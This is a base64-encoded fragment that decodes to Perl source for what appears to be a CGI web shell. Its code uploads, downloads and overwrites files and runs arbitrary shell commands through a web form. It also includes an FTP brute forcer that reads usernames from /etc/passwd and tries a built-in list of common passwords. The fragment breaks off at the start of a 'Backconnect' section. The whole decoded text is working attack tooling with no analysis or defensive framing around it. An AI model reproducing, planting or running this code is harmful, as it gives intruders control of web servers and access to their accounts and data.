QhIjsNCgkJJHJlc3VsdCAuPSAmUHJpbnRGaWxlRG93bmxvYWRGb3JtOw0KCX0NCglyZXR1cm4gJHJlc3VsdDsNCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBUaGlzIGZ1bmN0aW9uIHJlYWRzIHRoZSBzcGVjaWZpZWQgZmlsZSBmcm9tIHRoZSBkaXNrIGFuZCBzZW5kcyBpdCB0byB0aGUNCiMgYnJvd3Nlciwgc28gdGhhdCBpdCBjYW4gYmUgZG93bmxvYWRlZCBieSB0aGUgdXNlci4NCiMgQXJndW1lbnQgMTogRnVsbHkgcXVhbGlmaWVkIHBhdGhuYW1lIG9mIHRoZSBmaWxlIHRvIGJlIHNlbnQuDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgU2VuZEZpbGVUb0Jyb3dzZXINCnsNCglteSAkcmVzdWx0ID0gIiI7DQoJbG9jYWwoJFNlbmRGaWxlKSA9IEBfOw0KCWlmKG9wZW4oU0VOREZJTEUsICRTZW5kRmlsZSkpICMgZmlsZSBvcGVuZWQgZm9yIHJlYWRpbmcNCgl7DQoJCWlmKCRXaW5OVCkNCgkJew0KCQkJYmlubW9kZShTRU5ERklMRSk7DQoJCQliaW5tb2RlKFNURE9VVCk7DQoJCX0NCgkJJEZpbGVTaXplID0gKHN0YXQoJFNlbmRGaWxlKSlbN107DQoJCSgkRmlsZW5hbWUgPSAkU2VuZEZpbGUpID1+ICBtIShbXi9eXFxdKikkITsNCgkJcHJpbnQgIkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC11bmtub3duXG4iOw0KCQlwcmludCAiQ29udGVudC1MZW5ndGg6ICRGaWxlU2l6ZVxuIjsNCgkJcHJpbnQgIkNvbnRlbnQtRGlzcG9zaXRpb246IGF0dGFjaG1lbnQ7IGZpbGVuYW1lPSQxXG5cbiI7DQoJCXByaW50IHdoaWxlKDxTRU5ERklMRT4pOw0KCQljbG9zZShTRU5ERklMRSk7DQoJCWV4aXQoMSk7DQoJfQ0KCWVsc2UgIyBmYWlsZWQgdG8gb3BlbiBmaWxlDQoJew0KCQkkcmVzdWx0IC49ICJGYWlsZWQgdG8gZG93bmxvYWQgJFNlbmRGaWxlOiAkISI7DQoJCSRyZXN1bHQgLj0mUHJpbnRGaWxlRG93bmxvYWRGb3JtOw0KCX0NCglyZXR1cm4gJHJlc3VsdDsNCn0NCg0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHdoZW4gdGhlIHVzZXIgZG93bmxvYWRzIGEgZmlsZS4gSXQgZGlzcGxheXMgYSBtZXNzYWdlDQojIHRvIHRoZSB1c2VyIGFuZCBwcm92aWRlcyBhIGxpbmsgdGhyb3VnaCB3aGljaCB0aGUgZmlsZSBjYW4gYmUgZG93bmxvYWRlZC4NCiMgVGhpcyBmdW5jdGlvbiBpcyBhbHNvIGNhbGxlZCB3aGVuIHRoZSB1c2VyIGNsaWNrcyBvbiB0aGF0IGxpbmsuIEluIHRoaXMgY2FzZSwNCiMgdGhlIGZpbGUgaXMgcmVhZCBhbmQgc2VudCB0byB0aGUgYnJvd3Nlci4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBCZWdpbkRvd25sb2FkDQp7DQoJIyBnZXQgZnVsbHkgcXVhbGlmaWVkIHBhdGggb2YgdGhlIGZpbGUgdG8gYmUgZG93bmxvYWRlZA0KCWlmKCgkV2luTlQgJiAoJFRyYW5zZmVyRmlsZSA9fiBtL15cXHxeLjovKSkgfA0KCQkoISRXaW5OVCAmICgkVHJhbnNmZXJGaWxlID1+IG0vXlwvLykpKSAjIHBhdGggaXMgYWJzb2x1dGUNCgl7DQoJCSRUYXJnZXRGaWxlID0gJFRyYW5zZmVyRmlsZTsNCgl9DQoJZWxzZSAjIHBhdGggaXMgcmVsYXRpdmUNCgl7DQoJCWNob3AoJFRhcmdldEZpbGUpIGlmKCRUYXJnZXRGaWxlID0gJEN1cnJlbnREaXIpID1+IG0vW1xcXC9dJC87DQoJCSRUYXJnZXRGaWxlIC49ICRQYXRoU2VwLiRUcmFuc2ZlckZpbGU7DQoJfQ0KDQoJaWYoJE9wdGlvbnMgZXEgImdvIikgIyB3ZSBoYXZlIHRvIHNlbmQgdGhlIGZpbGUNCgl7DQoJCSZTZW5kRmlsZVRvQnJvd3NlcigkVGFyZ2V0RmlsZSk7DQoJfQ0KCWVsc2UgIyB3ZSBoYXZlIHRvIHNlbmQgb25seSB0aGUgbGluayBwYWdlDQoJew0KCQkmUHJpbnREb3dubG9hZExpbmtQYWdlKCRUYXJnZXRGaWxlKTsNCgl9DQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgd2hlbiB0aGUgdXNlciB3YW50cyB0byB1cGxvYWQgYSBmaWxlLiBJZiB0aGUNCiMgZmlsZSBpcyBub3Qgc3BlY2lmaWVkLCBpdCBkaXNwbGF5cyBhIGZvcm0gYWxsb3dpbmcgdGhlIHVzZXIgdG8gc3BlY2lmeSBhDQojIGZpbGUsIG90aGVyd2lzZSBpdCBzdGFydHMgdGhlIHVwbG9hZCBwcm9jZXNzLg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFVwbG9hZEZpbGUNCnsNCgkjIGlmIG5vIGZpbGUgaXMgc3BlY2lmaWVkLCBwcmludCB0aGUgdXBsb2FkIGZvcm0gYWdhaW4NCglpZigkVHJhbnNmZXJGaWxlIGVxICIiKQ0KCXsNCgkJcmV0dXJuICZQcmludEZpbGVVcGxvYWRGb3JtOw0KDQoJfQ0KCW15ICRyZXN1bHQ9IiI7DQoJIyBzdGFydCB0aGUgdXBsb2FkaW5nIHByb2Nlc3MNCgkkcmVzdWx0IC49ICJVcGxvYWRpbmcgJFRyYW5zZmVyRmlsZSB0byAkQ3VycmVudERpci4uLjxicj4iOw0KDQoJIyBnZXQgdGhlIGZ1bGxseSBxdWFsaWZpZWQgcGF0aG5hbWUgb2YgdGhlIGZpbGUgdG8gYmUgY3JlYXRlZA0KCWNob3AoJFRhcmdldE5hbWUpIGlmICgkVGFyZ2V0TmFtZSA9ICRDdXJyZW50RGlyKSA9fiBtL1tcXFwvXSQvOw0KCSRUcmFuc2ZlckZpbGUgPX4gbSEoW14vXlxcXSopJCE7DQoJJFRhcmdldE5hbWUgLj0gJFBhdGhTZXAuJDE7DQoNCgkkVGFyZ2V0RmlsZVNpemUgPSBsZW5ndGgoJGlueydmaWxlZGF0YSd9KTsNCgkjIGlmIHRoZSBmaWxlIGV4aXN0cyBhbmQgd2UgYXJlIG5vdCBzdXBwb3NlZCB0byBvdmVyd3JpdGUgaXQNCglpZigtZSAkVGFyZ2V0TmFtZSAmJiAkT3B0aW9ucyBuZSAib3ZlcndyaXRlIikNCgl7DQoJCSRyZXN1bHQgLj0gIkZhaWxlZDogRGVzdGluYXRpb24gZmlsZSBhbHJlYWR5IGV4aXN0cy48YnI+IjsNCgl9DQoJZWxzZSAjIGZpbGUgaXMgbm90IHByZXNlbnQNCgl7DQoJCWlmKG9wZW4oVVBMT0FERklMRSwgIj4kVGFyZ2V0TmFtZSIpKQ0KCQl7DQoJCQliaW5tb2RlKFVQTE9BREZJTEUpIGlmICRXaW5OVDsNCgkJCXByaW50IFVQTE9BREZJTEUgJGlueydmaWxlZGF0YSd9Ow0KCQkJY2xvc2UoVVBMT0FERklMRSk7DQoJCQkkcmVzdWx0IC49ICJUcmFuc2ZlcmVkICRUYXJnZXRGaWxlU2l6ZSBCeXRlcy48YnI+IjsNCgkJCSRyZXN1bHQgLj0gIkZpbGUgUGF0aDogJFRhcmdldE5hbWU8YnI+IjsNCgkJfQ0KCQllbHNlDQoJCXsNCgkJCSRyZXN1bHQgLj0gIkZhaWxlZDogJCE8YnI+IjsNCgkJfQ0KCX0NCgkkcmVzdWx0IC49ICZQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtOw0KCXJldHVybiAkcmVzdWx0Ow0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHdoZW4gdGhlIHVzZXIgd2FudHMgdG8gZG93bmxvYWQgYSBmaWxlLiBJZiB0aGUNCiMgZmlsZW5hbWUgaXMgbm90IHNwZWNpZmllZCwgaXQgZGlzcGxheXMgYSBmb3JtIGFsbG93aW5nIHRoZSB1c2VyIHRvIHNwZWNpZnkgYQ0KIyBmaWxlLCBvdGhlcndpc2UgaXQgZGlzcGxheXMgYSBtZXNzYWdlIHRvIHRoZSB1c2VyIGFuZCBwcm92aWRlcyBhIGxpbmsNCiMgdGhyb3VnaCAgd2hpY2ggdGhlIGZpbGUgY2FuIGJlIGRvd25sb2FkZWQuDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgRG93bmxvYWRGaWxlDQp7DQoJIyBpZiBubyBmaWxlIGlzIHNwZWNpZmllZCwgcHJpbnQgdGhlIGRvd25sb2FkIGZvcm0gYWdhaW4NCglpZigkVHJhbnNmZXJGaWxlIGVxICIiKQ0KCXsNCgkJJlByaW50UGFnZUhlYWRlcigiZiIpOw0KCQlyZXR1cm4gJlByaW50RmlsZURvd25sb2FkRm9ybTsNCgl9DQoJDQoJIyBnZXQgZnVsbHkgcXVhbGlmaWVkIHBhdGggb2YgdGhlIGZpbGUgdG8gYmUgZG93bmxvYWRlZA0KCWlmKCgkV2luTlQgJiAoJFRyYW5zZmVyRmlsZSA9fiBtL15cXHxeLjovKSkgfCAoISRXaW5OVCAmICgkVHJhbnNmZXJGaWxlID1+IG0vXlwvLykpKSAjIHBhdGggaXMgYWJzb2x1dGUNCgl7DQoJCSRUYXJnZXRGaWxlID0gJFRyYW5zZmVyRmlsZTsNCgl9DQoJZWxzZSAjIHBhdGggaXMgcmVsYXRpdmUNCgl7DQoJCWNob3AoJFRhcmdldEZpbGUpIGlmKCRUYXJnZXRGaWxlID0gJEN1cnJlbnREaXIpID1+IG0vW1xcXC9dJC87DQoJCSRUYXJnZXRGaWxlIC49ICRQYXRoU2VwLiRUcmFuc2ZlckZpbGU7DQoJfQ0KDQoJaWYoJE9wdGlvbnMgZXEgImdvIikgIyB3ZSBoYXZlIHRvIHNlbmQgdGhlIGZpbGUNCgl7DQoJCXJldHVybiAmU2VuZEZpbGVUb0Jyb3dzZXIoJFRhcmdldEZpbGUpOw0KCX0NCgllbHNlICMgd2UgaGF2ZSB0byBzZW5kIG9ubHkgdGhlIGxpbmsgcGFnZQ0KCXsNCgkJcmV0dXJuICZQcmludERvd25sb2FkTGlua1BhZ2UoJFRhcmdldEZpbGUpOw0KCX0NCn0NCg0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHRvIGV4ZWN1dGUgY29tbWFuZHMuIEl0IGRpc3BsYXlzIHRoZSBvdXRwdXQgb2YgdGhlDQojIGNvbW1hbmQgYW5kIGFsbG93cyB0aGUgdXNlciB0byBlbnRlciBhbm90aGVyIGNvbW1hbmQuIFRoZSBjaGFuZ2UgZGlyZWN0b3J5DQojIGNvbW1hbmQgaXMgaGFuZGxlZCBkaWZmZXJlbnRseS4gSW4gdGhpcyBjYXNlLCB0aGUgbmV3IGRpcmVjdG9yeSBpcyBzdG9yZWQgaW4NCiMgYW4gaW50ZXJuYWwgdmFyaWFibGUgYW5kIGlzIHVzZWQgZWFjaCB0aW1lIGEgY29tbWFuZCBoYXMgdG8gYmUgZXhlY3V0ZWQuIFRoZQ0KIyBvdXRwdXQgb2YgdGhlIGNoYW5nZSBkaXJlY3RvcnkgY29tbWFuZCBpcyBub3QgZGlzcGxheWVkIHRvIHRoZSB1c2Vycw0KIyB0aGVyZWZvcmUgZXJyb3IgbWVzc2FnZXMgY2Fubm90IGJlIGRpc3BsYXllZC4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBFeGVjdXRlQ29tbWFuZA0Kew0KCW15ICRyZXN1bHQ9IiI7DQoJaWYoJFJ1bkNvbW1hbmQgPX4gbS9eXHMqY2RccysoLispLykgIyBpdCBpcyBhIGNoYW5nZSBkaXIgY29tbWFuZA0KCXsNCgkJIyB3ZSBjaGFuZ2UgdGhlIGRpcmVjdG9yeSBpbnRlcm5hbGx5LiBUaGUgb3V0cHV0IG9mIHRoZQ0KCQkjIGNvbW1hbmQgaXMgbm90IGRpc3BsYXllZC4NCgkJJENvbW1hbmQgPSAiY2QgXCIkQ3VycmVudERpclwiIi4kQ21kU2VwLiJjZCAkMSIuJENtZFNlcC4kQ21kUHdkOw0KCQljaG9wKCRDdXJyZW50RGlyID0gYCRDb21tYW5kYCk7DQoJCSRyZXN1bHQgLj0gJlByaW50Q29tbWFuZExpbmVJbnB1dEZvcm07DQoNCgkJJHJlc3VsdCAuPSAiQ29tbWFuZDogPHJ1bj4kUnVuQ29tbWFuZCA8L3J1bj48YnI+PHRleHRhcmVhIGNvbHM9JyRjb2xzJyByb3dzPSckcm93cycgc3BlbGxjaGVjaz0nZmFsc2UnPiI7DQoJCSMgeHVhdCB0aG9uZyB0aW4ga2hpIGNodXllbiBkZW4gMSB0aHUgbXVjIG5hbyBkbyENCgkJJFJ1bkNvbW1hbmQ9ICRXaW5OVD8iZGlyIjoiZGlyIC1saWEiOw0KCQkkcmVzdWx0IC49ICZSdW5DbWQ7DQoJfWVsc2lmKCRSdW5Db21tYW5kID1+IG0vXlxzKmVkaXRccysoLispLykNCgl7DQoJCSRyZXN1bHQgLj0gICZTYXZlRmlsZUZvcm07DQoJfWVsc2UNCgl7DQoJCSRyZXN1bHQgLj0gJlByaW50Q29tbWFuZExpbmVJbnB1dEZvcm07DQoJCSRyZXN1bHQgLj0gIkNvbW1hbmQ6IDxydW4+JFJ1bkNvbW1hbmQ8L3J1bj48YnI+PHRleHRhcmVhIGlkPSdkYXRhJyBjb2xzPSckY29scycgcm93cz0nJHJvd3MnIHNwZWxsY2hlY2s9J2ZhbHNlJz4iOw0KCQkkcmVzdWx0IC49JlJ1bkNtZDsNCgl9DQoJJHJlc3VsdCAuPSAgIjwvdGV4dGFyZWE+IjsNCglyZXR1cm4gJHJlc3VsdDsNCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBydW4gY29tbWFuZA0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KDQpzdWIgUnVuQ21kDQp7DQoJbXkgJHJlc3VsdD0iIjsNCgkkQ29tbWFuZCA9ICJjZCBcIiRDdXJyZW50RGlyXCIiLiRDbWRTZXAuJFJ1bkNvbW1hbmQuJFJlZGlyZWN0b3I7DQoJaWYoISRXaW5OVCkNCgl7DQoJCSRTSUd7J0FMUk0nfSA9IFwmQ29tbWFuZFRpbWVvdXQ7DQoJCWFsYXJtKCRDb21tYW5kVGltZW91dER1cmF0aW9uKTsNCgl9DQoJaWYoJFNob3dEeW5hbWljT3V0cHV0KSAjIHNob3cgb3V0cHV0IGFzIGl0IGlzIGdlbmVyYXRlZA0KCXsNCgkJJHw9MTsNCgkJJENvbW1hbmQgLj0gIiB8IjsNCgkJb3BlbihDb21tYW5kT3V0cHV0LCAkQ29tbWFuZCk7DQoJCXdoaWxlKDxDb21tYW5kT3V0cHV0PikNCgkJew0KCQkJJF8gPX4gcy8oXG58XHJcbikkLy87DQoJCQkkcmVzdWx0IC49ICZIdG1sU3BlY2lhbENoYXJzKCIkX1xuIik7DQoJCX0NCgkJJHw9MDsNCgl9DQoJZWxzZSAjIHNob3cgb3V0cHV0IGFmdGVyIGNvbW1hbmQgY29tcGxldGVzDQoJew0KCQkkcmVzdWx0IC49ICZIdG1sU3BlY2lhbENoYXJzKCckQ29tbWFuZCcpOw0KCX0NCglpZighJFdpbk5UKQ0KCXsNCgkJYWxhcm0oMCk7DQoJfQ0KCXJldHVybiAkcmVzdWx0Ow0KfQ0KIz09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQ0KIyBGb3JtIFNhdmUgRmlsZSANCiM9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0NCnN1YiBTYXZlRmlsZUZvcm0NCnsNCglteSAkcmVzdWx0ID0iIjsNCglzdWJzdHIoJFJ1bkNvbW1hbmQsMCw1KT0iIjsNCglteSAkZmlsZT0mdHJpbSgkUnVuQ29tbWFuZCk7DQoJJHNhdmU9Jzxicj48aW5wdXQgbmFtZT0iYSIgdHlwZT0ic3VibWl0IiB2YWx1ZT0ic2F2ZSIgY2xhc3M9InN1Ym1pdCIgPic7DQoJJEZpbGU9JEN1cnJlbnREaXIuJFBhdGhTZXAuJFJ1bkNvbW1hbmQ7DQoJbXkgJGRpcj0iPHNwYW4gc3R5bGU9J2ZvbnQ6IDExcHQgVmVyZGFuYTsgZm9udC13ZWlnaHQ6IGJvbGQ7Jz4iLiZBZGRMaW5rRGlyKCJndWkiKS4iPC9zcGFuPiI7DQoJaWYoLXcgJEZpbGUpDQoJew0KCQkkcm93cz0iMjMiDQoJfWVsc2UNCgl7DQoJCSRtc2c9Ijxicj48Zm9udCBzdHlsZT0nZm9udDogMTVwdCBWZXJkYW5hOyBjb2xvcjogeWVsbG93OycgPiBQZXJtaXNzaW9uIGRlbmllZCE8Zm9udD48YnI+IjsNCgkJJHJvd3M9IjIwIg0KCX0NCgkkUHJvbXB0ID0gJFdpbk5UID8gIiRkaXIgPiAiIDogIjxmb250IGNvbG9yPScjRkZGRkZGJz5bYWRtaW5cQCRTZXJ2ZXJOYW1lICRkaXJdXCQ8L2ZvbnQ+ICI7DQoJJHJlYWQ9KCRXaW5OVCk/InR5cGUiOiJsZXNzIjsNCgkkUnVuQ29tbWFuZCA9ICIkcmVhZCBcIiRSdW5Db21tYW5kXCIiOw0KCSRyZXN1bHQgLj0gIDw8RU5EOw0KCTxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPg0KDQoJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iZCIgdmFsdWU9IiRDdXJyZW50RGlyIj4NCgkkUHJvbXB0DQoJPGlucHV0IHR5cGU9InRleHQiIHNpemU9IjQwIiBuYW1lPSJjIj4NCgk8aW5wdXQgbmFtZT0icyIgY2xhc3M9InN1Ym1pdCIgdHlwZT0ic3VibWl0IiB2YWx1ZT0iRW50ZXIiPg0KCTxicj5Db21tYW5kOiA8cnVuPiAkUnVuQ29tbWFuZCA8L3J1bj4NCgk8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJmaWxlIiB2YWx1ZT0iJGZpbGUiID4gJHNhdmUgPGJyPiAkbXNnDQoJPGJyPjx0ZXh0YXJlYSBpZD0iZGF0YSIgbmFtZT0iZGF0YSIgY29scz0iJGNvbHMiIHJvd3M9IiRyb3dzIiBzcGVsbGNoZWNrPSJmYWxzZSI+DQpFTkQNCgkNCgkkcmVzdWx0IC49ICZSdW5DbWQ7DQoJJHJlc3VsdCAuPSAgIjwvdGV4dGFyZWE+IjsNCgkkcmVzdWx0IC49ICAiPC9mb3JtPiI7DQoJcmV0dXJuICRyZXN1bHQ7DQp9DQojPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09DQojIFNhdmUgRmlsZQ0KIz09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQ0Kc3ViIFNhdmVGaWxlKCQpDQp7DQoJbXkgJERhdGE9IHNoaWZ0IDsNCglteSAkRmlsZT0gc2hpZnQ7DQoJJEZpbGU9JEN1cnJlbnREaXIuJFBhdGhTZXAuJEZpbGU7DQoJaWYob3BlbihGSUxFLCAiPiRGaWxlIikpDQoJew0KCQliaW5tb2RlIEZJTEU7DQoJCXByaW50IEZJTEUgJERhdGE7DQoJCWNsb3NlIEZJTEU7DQoJCXJldHVybiAxOw0KCX1lbHNlDQoJew0KCQlyZXR1cm4gMDsNCgl9DQp9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIEJydXRlIEZvcmNlciBGb3JtDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgQnJ1dGVGb3JjZXJGb3JtDQp7DQoJbXkgJHJlc3VsdD0iIjsNCgkkcmVzdWx0IC49IDw8RU5EOw0KDQo8dGFibGU+DQoNCjx0cj4NCjx0ZCBjb2xzcGFuPSIyIiBhbGlnbj0iY2VudGVyIj4NCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIzxicj4NClNpbXBsZSBGVFAgYnJ1dGUgZm9yY2VyPGJyPg0KIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjDQo8Zm9ybSBuYW1lPSJmIiBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iJFNjcmlwdExvY2F0aW9uIj4NCg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9ImJydXRlZm9yY2VyIi8+DQo8L3RkPg0KPC90cj4NCjx0cj4NCjx0ZD5Vc2VyOjxicj48dGV4dGFyZWEgcm93cz0iMTgiIGNvbHM9IjMwIiBuYW1lPSJ1c2VyIj4NCkVORA0KY2hvcCgkcmVzdWx0IC49IGBsZXNzIC9ldGMvcGFzc3dkIHwgY3V0IC1kOiAtZjFgKTsNCiRyZXN1bHQgLj0gPDwnRU5EJzsNCjwvdGV4dGFyZWE+PC90ZD4NCjx0ZD4NCg0KUGFzczo8YnI+DQo8dGV4dGFyZWEgcm93cz0iMTgiIGNvbHM9IjMwIiBuYW1lPSJwYXNzIj4xMjNwYXNzDQoxMjMhQCMNCjEyM2FkbWluDQoxMjNhYmMNCjEyMzQ1NmFkbWluDQoxMjM0NTU0MzIxDQoxMjM0NDMyMQ0KcGFzczEyMw0KYWRtaW4NCmFkbWluY3ANCmFkbWluaXN0cmF0b3INCm1hdGtoYXUNCnBhc3NhZG1pbg0KcEBzc3dvcmQNCnBAc3N3MHJkDQpwYXNzd29yZA0KMTIzNDU2DQoxMjM0NTY3DQoxMjM0NTY3OA0KMTIzNDU2Nzg5DQoxMjM0NTY3ODkwDQoxMTExMTENCjAwMDAwMA0KMjIyMjIyDQozMzMzMzMNCjQ0NDQ0NA0KNTU1NTU1DQo2NjY2NjYNCjc3Nzc3Nw0KODg4ODg4DQo5OTk5OTkNCjEyMzEyMw0KMjM0MjM0DQozNDUzNDUNCjQ1NjQ1Ng0KNTY3NTY3DQo2Nzg2NzgNCjc4OTc4OQ0KMTIzMzIxDQo0NTY2NTQNCjY1NDMyMQ0KNzY1NDMyMQ0KODc2NTQzMjENCjk4NzY1NDMyMQ0KMDk4NzY1NDMyMQ0KYWRtaW4xMjMNCmFkbWluMTIzNDU2DQphYmNkZWYNCmFiY2FiYw0KIUAjIUAjDQohQCMkJV4NCiFAIyQlXiYqKA0KIUAjJCQjQCENCmFiYzEyMw0KYW5oeWV1ZW0NCmlsb3ZleW91PC90ZXh0YXJlYT4NCjwvdGQ+DQo8L3RyPg0KPHRyPg0KPHRkIGNvbHNwYW49IjIiIGFsaWduPSJjZW50ZXIiPg0KU2xlZXA6PHNlbGVjdCBuYW1lPSJzbGVlcCI+DQoNCjxvcHRpb24+MDwvb3B0aW9uPg0KPG9wdGlvbj4xPC9vcHRpb24+DQo8b3B0aW9uPjI8L29wdGlvbj4NCg0KPG9wdGlvbj4zPC9vcHRpb24+DQo8L3NlbGVjdD4gDQo8aW5wdXQgdHlwZT0ic3VibWl0IiBjbGFzcz0ic3VibWl0IiB2YWx1ZT0iQnJ1dGUgRm9yY2VyIi8+PC90ZD48L3RyPg0KPC9mb3JtPg0KPC90YWJsZT4NCkVORA0KcmV0dXJuICRyZXN1bHQ7DQp9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIEJydXRlIEZvcmNlcg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIEJydXRlRm9yY2VyDQp7DQoJbXkgJHJlc3VsdD0iIjsNCgkkU2VydmVyPSRFTlZ7J1NFUlZFUl9BRERSJ307DQoJaWYoJGlueyd1c2VyJ30gZXEgIiIpDQoJew0KCQkkcmVzdWx0IC49ICZCcnV0ZUZvcmNlckZvcm07DQoJfWVsc2UNCgl7DQoJCXVzZSBOZXQ6OkZUUDsgDQoJCUB1c2VyPSBzcGxpdCgvXG4vLCAkaW57J3VzZXInfSk7DQoJCUBwYXNzPSBzcGxpdCgvXG4vLCAkaW57J3Bhc3MnfSk7DQoJCWNob21wKEB1c2VyKTsNCgkJY2hvbXAoQHBhc3MpOw0KCQkkcmVzdWx0IC49ICI8YnI+PGJyPlsrXSBUcnlpbmcgYnJ1dGUgJFNlcnZlck5hbWU8YnI+PT09PT09PT09PT09PT09PT09PT0+Pj4+Pj4+Pj4+Pj48PDw8PDw8PDw8PT09PT09PT09PT09PT09PT09PT08YnI+PGJyPlxuIjsNCgkJZm9yZWFjaCAkdXNlcm5hbWUgKEB1c2VyKQ0KCQl7DQoJCQlpZighKCR1c2VybmFtZSBlcSAiIikpDQoJCQl7DQoJCQkJZm9yZWFjaCAkcGFzc3dvcmQgKEBwYXNzKQ0KCQkJCXsNCgkJCQkJJGZ0cCA9IE5ldDo6RlRQLT5uZXcoJFNlcnZlcikgb3IgZGllICJDb3VsZCBub3QgY29ubmVjdCB0byAkU2VydmVyTmFtZVxuIjsgDQoJCQkJCWlmKCRmdHAtPmxvZ2luKCIkdXNlcm5hbWUiLCIkcGFzc3dvcmQiKSkNCgkJCQkJew0KCQkJCQkJJHJlc3VsdCAuPSAiPGEgdGFyZ2V0PSdfYmxhbmsnIGhyZWY9J2Z0cDovLyR1c2VybmFtZTokcGFzc3dvcmRcQCRTZXJ2ZXInPlsrXSBmdHA6Ly8kdXNlcm5hbWU6JHBhc3N3b3JkXEAkU2VydmVyPC9hPjxicj5cbiI7DQoJCQkJCQkkZnRwLT5xdWl0KCk7DQoJCQkJCQlicmVhazsNCgkJCQkJfQ0KCQkJCQlpZighKCRpbnsnc2xlZXAnfSBlcSAiMCIpKQ0KCQkJCQl7DQoJCQkJCQlzbGVlcChpbnQoJGlueydzbGVlcCd9KSk7DQoJCQkJCX0NCgkJCQkJJGZ0cC0+cXVpdCgpOw0KCQkJCX0NCgkJCX0NCgkJfQ0KCQkkcmVzdWx0IC49ICJcbjxicj49PT09PT09PT09Pj4+Pj4+Pj4+PiBGaW5pc2hlZCA8PDw8PDw8PDw8PT09PT09PT09PTxicj5cbiI7DQoJfQ0KCXJldHVybiAkcmVzdWx0Ow0KfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBCYWNrY29ubmVjdCBGb3JtDQojLS0tLS0tLS0tLS0tLS0tLS0tLS